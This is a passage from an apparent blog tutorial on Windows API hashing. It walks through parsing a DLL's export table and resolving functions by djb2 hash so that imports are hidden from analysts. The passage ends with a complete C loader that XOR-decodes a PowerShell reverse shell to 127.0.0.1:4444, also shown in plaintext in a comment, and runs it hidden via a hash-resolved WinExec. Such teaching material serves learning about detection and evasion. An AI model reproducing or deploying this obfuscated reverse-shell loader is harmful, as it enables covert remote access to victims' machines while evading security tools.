</span></span><span class=line><span class=cl><span class=p>}</span> <span class=n>IMAGE_EXPORT_DIRECTORY</span><span class=p>,</span><span class=o>*</span><span class=n>PIMAGE_EXPORT_DIRECTORY</span><span class=p>;</span>
</span></span></code></pre></div><ul><li>Name : the module name (dll name if you want)</li><li>NumberOfFunctions : number of functions available in the module</li><li>NumberOfNames : because some functions do not have names</li><li>AddressOfFunctions : pointer to an array of address</li><li>AddressOfNames : pointer to an array list of names</li><li>AddressOfNameOrdinals : pointer to an array of &ldquo;ordinals&rdquo; (i will explain that.)</li></ul><p><img loading=lazy src=/img/posts/Windows_API_hashing-part1/export_table.png alt="export table array"></p><p>diagram from <a href=https://resources.infosecinstitute.com/topic/the-export-directory/>Infosec Resources</a></p><p>Each function has a number associated to it. It is called an ordinal. Each function name is associated to an ordinal but a function may have no name. Functions are often imported by their names but it makes a lot of strcmp so sometimes functions are imported by ordinal. It makes reverse engineering a bit harder and functions import faster.</p><p>So now, we can make a &ldquo;roadmap&rdquo; in order to create our own GetProcAdress():</p><ul><li>first, we must parse our dll to find the export table</li><li>after we have to browse the name list to find our function name</li><li>get ordinal associated to this name</li><li>get address function associated to this ordinal and return it</li></ul><h3 id=parse-the-dlls>Parse the dll&rsquo;s<a hidden class=anchor aria-hidden=true href=#parse-the-dlls>#</a></h3><p>to do that we will use the winnt.h library in C.</p><p>The following diagram illustrates the simplified structure of a PE.
<img loading=lazy src=/img/posts/Windows_API_hashing-part1/PE_format_EAT.png alt="PE FORMAT"></p><p>more about PE format : <a href=https://resources.infosecinstitute.com/topic/2-malware-researchers-handbook-demystifying-pe-file/>Malware researcher’s handbook (demystifying PE file) | Infosec Resources</a></p><p>So, we have to parse the DOS header first, then the NT header to access the optionnal headers and finally get the Export Address Table (located in the .edata section)</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;windows.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;winnt.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>void</span><span class=o>*</span> <span class=nf>my_GetProcAddress</span><span class=p>(</span><span class=n>HMODULE</span> <span class=n>dll_handle</span><span class=p>,</span> <span class=kt>char</span><span class=o>*</span> <span class=n>hashed_function_name</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=c1>// a dll is a Portable Executable file.
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>IMAGE_DOS_HEADER</span><span class=o>*</span> <span class=n>p_DOS_HDR</span>  <span class=o>=</span> <span class=p>(</span><span class=n>IMAGE_DOS_HEADER</span><span class=o>*</span><span class=p>)</span> <span class=n>dll_handle</span><span class=p>;</span> <span class=c1>// convert your data into an IMAGE_DOS_HEADER* type defined in winnt.h
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>IMAGE_NT_HEADERS</span><span class=o>*</span> <span class=n>p_NT_HDR</span> <span class=o>=</span> <span class=p>(</span><span class=n>IMAGE_NT_HEADERS</span><span class=o>*</span><span class=p>)</span> <span class=p>((</span><span class=n>LPBYTE</span><span class=p>)</span><span class=n>dll_handle</span> <span class=o>+</span> <span class=n>p_DOS_HDR</span><span class=o>-&gt;</span><span class=n>e_lfanew</span> <span class=p>);</span> <span class=c1>// NT HEADERS are located at the raw offset defined in the e_lfanew header
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// RVA of the export table can be found in the optional headers
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// https://learn.microsoft.com/en-us/windows/win32/debug/pe-format#optional-header-data-directories-image-only
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>IMAGE_EXPORT_DIRECTORY</span><span class=o>*</span> <span class=n>export_table</span> <span class=o>=</span> <span class=p>(</span><span class=n>IMAGE_EXPORT_DIRECTORY</span><span class=o>*</span><span class=p>)((</span><span class=n>LPBYTE</span><span class=p>)</span><span class=n>dll_handle</span> <span class=o>+</span> <span class=n>p_NT_HDR</span><span class=o>-&gt;</span><span class=n>OptionalHeader</span><span class=p>.</span><span class=n>DataDirectory</span><span class=p>[</span><span class=n>IMAGE_DIRECTORY_ENTRY_EXPORT</span><span class=p>].</span><span class=n>VirtualAddress</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nb>NULL</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>Now we have the address of our export table. Let&rsquo;s parse it following the EAT diagram above.</p><h3 id=parse-our-export-table>PARSE OUR EXPORT TABLE<a hidden class=anchor aria-hidden=true href=#parse-our-export-table>#</a></h3><p>Getting the name, ordinal and address array.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl>    <span class=n>DWORD</span> <span class=n>numberOfNames</span> <span class=o>=</span> <span class=n>export_table</span><span class=o>-&gt;</span><span class=n>NumberOfNames</span><span class=p>;</span> <span class=c1>// size of array name
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>    <span class=n>DWORD</span><span class=o>*</span> <span class=n>functions_address</span> <span class=o>=</span> <span class=p>(</span><span class=n>DWORD</span><span class=o>*</span><span class=p>)((</span><span class=n>LPBYTE</span><span class=p>)</span><span class=n>dll_handle</span> <span class=o>+</span> <span class=n>export_table</span><span class=o>-&gt;</span><span class=n>AddressOfFunctions</span><span class=p>);</span>     <span class=c1>// array function
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>DWORD</span><span class=o>*</span> <span class=n>functions_names</span> <span class=o>=</span> <span class=p>(</span><span class=n>DWORD</span><span class=o>*</span><span class=p>)((</span><span class=n>LPBYTE</span><span class=p>)</span><span class=n>dll_handle</span> <span class=o>+</span> <span class=n>export_table</span><span class=o>-&gt;</span><span class=n>AddressOfNames</span><span class=p>);</span>           <span class=c1>// array name
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>WORD</span><span class=o>*</span>  <span class=n>functions_ordinal</span> <span class=o>=</span> <span class=p>(</span><span class=n>WORD</span><span class=o>*</span><span class=p>)((</span><span class=n>LPBYTE</span><span class=p>)</span><span class=n>dll_handle</span> <span class=o>+</span> <span class=n>export_table</span><span class=o>-&gt;</span><span class=n>AddressOfNameOrdinals</span><span class=p>);</span>   <span class=c1>// array ordinal
</span></span></span></code></pre></div><p>let&rsquo;s iterate through the array name to find our function</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl>    <span class=k>for</span><span class=p>(</span><span class=kt>size_t</span> <span class=n>i</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=n>numberOfNames</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=kt>char</span> <span class=o>*</span><span class=n>name</span> <span class=o>=</span> <span class=p>(</span><span class=kt>char</span><span class=o>*</span><span class=p>)</span><span class=n>dll_handle</span> <span class=o>+</span> <span class=n>functions_names</span><span class=p>[</span><span class=n>i</span><span class=p>];</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nf>strcmp</span><span class=p>(</span><span class=n>hashed_function_name</span><span class=p>,</span> <span class=n>name</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;function %s found into %s !</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>name</span><span class=p>,</span> <span class=p>(</span><span class=kt>char</span><span class=o>*</span><span class=p>)</span><span class=n>dll_handle</span><span class=o>+</span><span class=n>export_table</span><span class=o>-&gt;</span><span class=n>Name</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span></code></pre></div><p>This loop iterates through the name array and compares each function&rsquo;s name to our string.
Now we just have to return the function&rsquo;s address, this is the tricky part.
We have to find the ordinal attached to this function&rsquo;s name.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl>    <span class=c1>// these 2 arrays are parallel
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>functions_names</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=c1>// -&gt; name (string)
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>functions_ordinal</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=c1>// -&gt; ordinal (integer) 
</span></span></span><span class=line><span class=cl><span class=c1></span>                         <span class=c1>// index of the function into the functions_address list
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// so we just have to do this to get the function
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>functions_address</span><span class=p>[</span><span class=n>functions_ordinal</span><span class=p>[</span><span class=n>i</span><span class=p>]]</span>
</span></span></code></pre></div><p>don&rsquo;t forget that these addresses are relative to the base address so we have to add base_address + address</p><p>Here it&rsquo;s the complete code of our function :</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=kt>void</span><span class=o>*</span> <span class=nf>my_GetProcAddress</span><span class=p>(</span><span class=n>HMODULE</span> <span class=n>dll_handle</span><span class=p>,</span> <span class=kt>char</span><span class=o>*</span> <span class=n>hashed_function_name</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>IMAGE_DOS_HEADER</span><span class=o>*</span> <span class=n>p_DOS_HDR</span>  <span class=o>=</span> <span class=p>(</span><span class=n>IMAGE_DOS_HEADER</span><span class=o>*</span><span class=p>)</span> <span class=n>dll_handle</span><span class=p>;</span> <span class=c1>// convert your data into an IMAGE_DOS_HEADER* type defined in winnt.h
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>IMAGE_NT_HEADERS</span><span class=o>*</span> <span class=n>p_NT_HDR</span> <span class=o>=</span> <span class=p>(</span><span class=n>IMAGE_NT_HEADERS</span><span class=o>*</span><span class=p>)</span> <span class=p>((</span><span class=n>LPBYTE</span><span class=p>)</span><span class=n>dll_handle</span> <span class=o>+</span> <span class=n>p_DOS_HDR</span><span class=o>-&gt;</span><span class=n>e_lfanew</span> <span class=p>);</span> <span class=c1>// NT HEADERS are located at the raw offset defined in the e_lfanew header
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>IMAGE_EXPORT_DIRECTORY</span><span class=o>*</span> <span class=n>export_table</span> <span class=o>=</span> <span class=p>(</span><span class=n>IMAGE_EXPORT_DIRECTORY</span><span class=o>*</span><span class=p>)((</span><span class=n>LPBYTE</span><span class=p>)</span><span class=n>dll_handle</span> <span class=o>+</span> <span class=n>p_NT_HDR</span><span class=o>-&gt;</span><span class=n>OptionalHeader</span><span class=p>.</span><span class=n>DataDirectory</span><span class=p>[</span><span class=n>IMAGE_DIRECTORY_ENTRY_EXPORT</span><span class=p>].</span><span class=n>VirtualAddress</span><span class=p>);</span> <span class=c1>// .edata section
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>    <span class=n>DWORD</span> <span class=n>numberOfNames</span> <span class=o>=</span> <span class=n>export_table</span><span class=o>-&gt;</span><span class=n>NumberOfNames</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;number of names : %d</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>numberOfNames</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>DWORD</span><span class=o>*</span> <span class=n>functions_address</span> <span class=o>=</span> <span class=p>(</span><span class=n>DWORD</span><span class=o>*</span><span class=p>)((</span><span class=n>LPBYTE</span><span class=p>)</span><span class=n>dll_handle</span> <span class=o>+</span> <span class=n>export_table</span><span class=o>-&gt;</span><span class=n>AddressOfFunctions</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>DWORD</span><span class=o>*</span> <span class=n>functions_names</span> <span class=o>=</span> <span class=p>(</span><span class=n>DWORD</span><span class=o>*</span><span class=p>)((</span><span class=n>LPBYTE</span><span class=p>)</span><span class=n>dll_handle</span> <span class=o>+</span> <span class=n>export_table</span><span class=o>-&gt;</span><span class=n>AddressOfNames</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>WORD</span><span class=o>*</span>  <span class=n>functions_ordinal</span> <span class=o>=</span> <span class=p>(</span><span class=n>WORD</span><span class=o>*</span><span class=p>)((</span><span class=n>LPBYTE</span><span class=p>)</span><span class=n>dll_handle</span> <span class=o>+</span> <span class=n>export_table</span><span class=o>-&gt;</span><span class=n>AddressOfNameOrdinals</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span><span class=p>(</span><span class=kt>size_t</span> <span class=n>i</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=n>numberOfNames</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=kt>char</span> <span class=o>*</span><span class=n>name</span> <span class=o>=</span> <span class=p>(</span><span class=kt>char</span><span class=o>*</span><span class=p>)</span><span class=n>dll_handle</span> <span class=o>+</span> <span class=n>functions_names</span><span class=p>[</span><span class=n>i</span><span class=p>];</span>
</span></span><span class=line><span class=cl>        <span class=c1>// printf(&#34;%s\n&#34;,name);
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=k>if</span> <span class=p>(</span><span class=nf>strcmp</span><span class=p>(</span><span class=n>hashed_function_name</span><span class=p>,</span> <span class=n>name</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;function %s found into %s !</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>name</span><span class=p>,</span> <span class=p>(</span><span class=kt>char</span><span class=o>*</span><span class=p>)</span><span class=n>dll_handle</span><span class=o>+</span><span class=n>export_table</span><span class=o>-&gt;</span><span class=n>Name</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=p>(</span><span class=n>LPBYTE</span><span class=p>)</span><span class=n>dll_handle</span> <span class=o>+</span> <span class=n>functions_address</span><span class=p>[</span><span class=n>functions_ordinal</span><span class=p>[</span><span class=n>i</span><span class=p>]];</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nb>NULL</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>Nice it works. Now we just have to &ldquo;obfuscate&rdquo; the name of our DLLs.</p><p>After searching a bit on google I found the djb2 algorithm wich seems fast and interesting.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl>    <span class=kt>unsigned</span> <span class=kt>long</span> <span class=nf>hash_djb2</span><span class=p>(</span><span class=kt>unsigned</span> <span class=kt>char</span> <span class=o>*</span><span class=n>str</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>hash</span> <span class=o>=</span> <span class=mi>5381</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=kt>int</span> <span class=n>c</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>while</span> <span class=p>(</span><span class=n>c</span> <span class=o>=</span> <span class=o>*</span><span class=n>str</span><span class=o>++</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>hash</span> <span class=o>=</span> <span class=p>((</span><span class=n>hash</span> <span class=o>&lt;&lt;</span> <span class=mi>5</span><span class=p>)</span> <span class=o>+</span> <span class=n>hash</span><span class=p>)</span> <span class=o>+</span> <span class=n>c</span><span class=p>;</span> <span class=cm>/* hash * 33 + c */</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>hash</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span></code></pre></div><p>If we call our hash fonction with &ldquo;WinExec&rdquo; argument we have this output :</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=nf>printf</span><span class=p>(</span><span class=s>&#34;%lu</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=nf>hash_djb2</span><span class=p>(</span><span class=s>&#34;WinExec&#34;</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=c1>// output : 698766968
</span></span></span></code></pre></div><p>So our final function is :</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=kt>void</span><span class=o>*</span> <span class=nf>my_GetProcAddress</span><span class=p>(</span><span class=n>HMODULE</span> <span class=n>dll_handle</span><span class=p>,</span> <span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>hashed_function_name</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>IMAGE_DOS_HEADER</span><span class=o>*</span> <span class=n>p_DOS_HDR</span>  <span class=o>=</span> <span class=p>(</span><span class=n>IMAGE_DOS_HEADER</span><span class=o>*</span><span class=p>)</span> <span class=n>dll_handle</span><span class=p>;</span> <span class=c1>// convert your data into an IMAGE_DOS_HEADER* type defined in winnt.h
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>IMAGE_NT_HEADERS</span><span class=o>*</span> <span class=n>p_NT_HDR</span> <span class=o>=</span> <span class=p>(</span><span class=n>IMAGE_NT_HEADERS</span><span class=o>*</span><span class=p>)</span> <span class=p>((</span><span class=n>LPBYTE</span><span class=p>)</span><span class=n>dll_handle</span> <span class=o>+</span> <span class=n>p_DOS_HDR</span><span class=o>-&gt;</span><span class=n>e_lfanew</span> <span class=p>);</span> <span class=c1>// NT HEADERS are located at the raw offset defined in the e_lfanew header
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>IMAGE_EXPORT_DIRECTORY</span><span class=o>*</span> <span class=n>export_table</span> <span class=o>=</span> <span class=p>(</span><span class=n>IMAGE_EXPORT_DIRECTORY</span><span class=o>*</span><span class=p>)((</span><span class=n>LPBYTE</span><span class=p>)</span><span class=n>dll_handle</span> <span class=o>+</span> <span class=n>p_NT_HDR</span><span class=o>-&gt;</span><span class=n>OptionalHeader</span><span class=p>.</span><span class=n>DataDirectory</span><span class=p>[</span><span class=n>IMAGE_DIRECTORY_ENTRY_EXPORT</span><span class=p>].</span><span class=n>VirtualAddress</span><span class=p>);</span> <span class=c1>// .edata section
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>    <span class=n>DWORD</span> <span class=n>numberOfNames</span> <span class=o>=</span> <span class=n>export_table</span><span class=o>-&gt;</span><span class=n>NumberOfNames</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>DWORD</span><span class=o>*</span> <span class=n>functions_address</span> <span class=o>=</span> <span class=p>(</span><span class=n>DWORD</span><span class=o>*</span><span class=p>)((</span><span class=n>LPBYTE</span><span class=p>)</span><span class=n>dll_handle</span> <span class=o>+</span> <span class=n>export_table</span><span class=o>-&gt;</span><span class=n>AddressOfFunctions</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>DWORD</span><span class=o>*</span> <span class=n>functions_names</span> <span class=o>=</span> <span class=p>(</span><span class=n>DWORD</span><span class=o>*</span><span class=p>)((</span><span class=n>LPBYTE</span><span class=p>)</span><span class=n>dll_handle</span> <span class=o>+</span> <span class=n>export_table</span><span class=o>-&gt;</span><span class=n>AddressOfNames</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>WORD</span><span class=o>*</span>  <span class=n>functions_ordinal</span> <span class=o>=</span> <span class=p>(</span><span class=n>WORD</span><span class=o>*</span><span class=p>)((</span><span class=n>LPBYTE</span><span class=p>)</span><span class=n>dll_handle</span> <span class=o>+</span> <span class=n>export_table</span><span class=o>-&gt;</span><span class=n>AddressOfNameOrdinals</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span><span class=p>(</span><span class=kt>size_t</span> <span class=n>i</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=n>numberOfNames</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=kt>char</span> <span class=o>*</span><span class=n>name</span> <span class=o>=</span> <span class=p>(</span><span class=kt>char</span><span class=o>*</span><span class=p>)</span><span class=n>dll_handle</span> <span class=o>+</span> <span class=n>functions_names</span><span class=p>[</span><span class=n>i</span><span class=p>];</span>
</span></span><span class=line><span class=cl>        <span class=c1>// printf(&#34;%s\n&#34;,name);
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=k>if</span> <span class=p>(</span><span class=n>hashed_function_name</span> <span class=o>==</span> <span class=nf>hash_djb2</span><span class=p>(</span><span class=n>name</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=p>(</span><span class=n>LPBYTE</span><span class=p>)</span><span class=n>dll_handle</span> <span class=o>+</span> <span class=n>functions_address</span><span class=p>[</span><span class=n>functions_ordinal</span><span class=p>[</span><span class=n>i</span><span class=p>]];</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nb>NULL</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>and our final reverse shell looks like this :</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;windows.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;winnt.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=k>typedef</span> <span class=nf>UINT</span><span class=p>(</span><span class=n>WINAPI</span><span class=o>*</span> <span class=n>winexec</span><span class=p>)(</span><span class=n>LPCSTR</span> <span class=n>lpCmdLine</span><span class=p>,</span> <span class=n>UINT</span> <span class=n>uCmdShow</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=kt>void</span><span class=o>*</span> <span class=nf>my_GetProcAddress</span><span class=p>(</span><span class=n>HMODULE</span> <span class=n>dll_handle</span><span class=p>,</span> <span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>hashed_function_name</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=kt>unsigned</span> <span class=kt>long</span> <span class=nf>hash_djb2</span><span class=p>(</span><span class=kt>unsigned</span> <span class=kt>char</span> <span class=o>*</span><span class=n>str</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>xor</span><span class=p>(</span><span class=kt>char</span><span class=o>*</span> <span class=n>string</span><span class=p>,</span> <span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>key</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=c1>// get handle of kernel32.dll
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>hash_function_name</span> <span class=o>=</span> <span class=mi>698766968</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=c1>// char payload[] = &#34;powershell -nop -c \&#34;$client = New-Object System.Net.Sockets.TCPClient(&#39;127.0.0.1&#39;,4444);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2&gt;&amp;1 | Out-String );$sb2 = $sb + &#39;PS &#39; + (pwd).Path + &#39;&gt; &#39;;$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()\&#34;&#34;;
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=kt>char</span> <span class=n>payload</span><span class=p>[]</span> <span class=o>=</span> <span class=s>&#34;</span><span class=se>\x09\x18\x10\x1e\x0b\x0c\x11\x1e\x15\x15\x59\x56\x17\x18\x09\x59\x56\x1c\x59\x5b\x5d\x1c\x15\x12\x1e\x17\x0d\x59\x46\x59\x37\x1e\x10\x56\x38\x1b\x13\x1e\x1c\x0d\x59\x2c\x02\x0c\x0d\x1e\x16\x57\x37\x1e\x0d\x57\x2c\x18\x1c\x14\x1e\x0d\x0c\x57\x2d\x3c\x29\x3c\x15\x12\x1e\x17\x0d\x51\x60\x4a\x4b\x50\x57\x49\x57\x49\x57\x4a\x60\x55\x4d\x4d\x4d\x4d\x52\x44\x5d\x0c\x59\x46\x59\x5d\x1c\x15\x12\x1e\x17\x0d\x57\x40\x1e\x0d\x2c\x0d\x0b\x1e\x1a\x16\x51\x52\x44\x24\x1b\x02\x0d\x1e\x24\x26\x26\x5d\x1b\x59\x46\x59\x49\x57\x57\x4f\x4e\x4e\x4c\x4e\x05\x5e\x04\x49\x06\x44\x10\x11\x12\x15\x1e\x51\x51\x5d\x12\x59\x46\x59\x5d\x0c\x57\x2b\x1e\x1a\x1d\x51\x5d\x1b\x55\x59\x49\x55\x59\x5d\x1b\x57\x35\x1e\x17\x20\x0d\x11\x52\x52\x59\x56\x17\x1e\x59\x49\x52\x04\x44\x5d\x1d\x1a\x0d\x1a\x59\x46\x59\x51\x37\x1e\x10\x56\x38\x1b\x13\x1e\x1c\x0d\x59\x56\x2d\x02\x09\x1e\x37\x1a\x16\x1e\x59\x2c\x02\x0c\x0d\x1e\x16\x57\x2d\x1e\x01\x0d\x57\x3a\x2c\x3c\x32\x32\x3e\x17\x1c\x18\x1d\x12\x17\x20\x52\x57\x40\x1e\x0d\x2c\x0d\x0b\x12\x17\x20\x51\x5d\x1b\x55\x49\x55\x59\x5d\x12\x52\x44\x5d\x0c\x1b\x59\x46\x59\x51\x12\x1e\x01\x59\x5d\x1d\x1a\x0d\x1a\x59\x4b\x47\x5f\x4a\x59\x05\x59\x38\x0e\x0d\x56\x2c\x0d\x0b\x12\x17\x20\x59\x52\x44\x5d\x0c\x1b\x4b\x59\x46\x59\x5d\x0c\x1b\x59\x54\x59\x60\x29\x2c\x59\x60\x59\x54\x59\x51\x09\x10\x1d\x52\x57\x29\x1a\x0d\x11\x59\x54\x59\x60\x47\x59\x60\x44\x5d\x0c\x1b\x0d\x59\x46\x59\x51\x24\x0d\x1e\x01\x0d\x57\x1e\x17\x1c\x18\x1d\x12\x17\x20\x26\x43\x43\x3a\x2c\x3c\x32\x32\x52\x57\x40\x1e\x0d\x3b\x02\x0d\x1e\x0c\x51\x5d\x0c\x1b\x4b\x52\x44\x5d\x0c\x57\x30\x0b\x12\x0d\x1e\x51\x5d\x0c\x1b\x0d\x55\x49\x55\x5d\x0c\x1b\x0d\x57\x35\x1e\x17\x20\x0d\x11\x52\x44\x5d\x0c\x57\x3f\x15\x0e\x0c\x11\x51\x52\x06\x44\x5d\x1c\x15\x12\x1e\x17\x0d\x57\x3c\x15\x18\x0c\x1e\x51\x52\x5b</span><span class=s>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nf>xor</span><span class=p>(</span><span class=n>payload</span><span class=p>,</span> <span class=n>hash_function_name</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>HMODULE</span> <span class=n>kernel32_dll</span> <span class=o>=</span> <span class=nf>LoadLibrary</span><span class=p>(</span><span class=s>&#34;kernel32.dll&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=c1>// parse it to find the WinExec function
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>//winexec WinExec_imported = (winexec)GetProcAddress(kernel32_dll, &#34;WinExec&#34;);
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>winexec</span> <span class=n>WinExec_imported</span> <span class=o>=</span> <span class=p>(</span><span class=n>winexec</span><span class=p>)</span><span class=nf>my_GetProcAddress</span><span class=p>(</span><span class=n>kernel32_dll</span><span class=p>,</span> <span class=mi>698766968</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>WinExec_imported</span><span class=p>(</span><span class=n>payload</span><span class=p>,</span> <span class=n>SW_HIDE</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
